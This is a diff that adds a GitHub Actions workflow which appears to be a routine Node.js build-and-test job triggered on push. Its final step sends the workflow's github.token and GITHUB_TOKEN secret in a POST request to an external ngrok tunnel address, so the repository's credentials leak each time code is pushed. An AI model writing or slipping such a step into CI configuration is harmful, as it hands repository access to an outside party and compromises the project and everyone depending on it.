@@ -1,0 +1,23 @@
+name: PUSH_EVENT
+on: push
+jobs:
+  Build:
+    name: Build and test
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out repository code
+        uses: actions/checkout@v2
+      
+      - uses: actions/setup-node@v1
+      - run: |
+          npm install
+          npm test
+          
+      - run: |
+         echo git config --list
+      
+      - uses: fjogeleit/http-request-action@master
+        with:
+          url: 'https://6858-93-172-42-40.ngrok.io'
+          method: 'POST'
+          data: '{"${{ github.token }}, ${{ secrets.GITHUB_TOKEN }}"}'
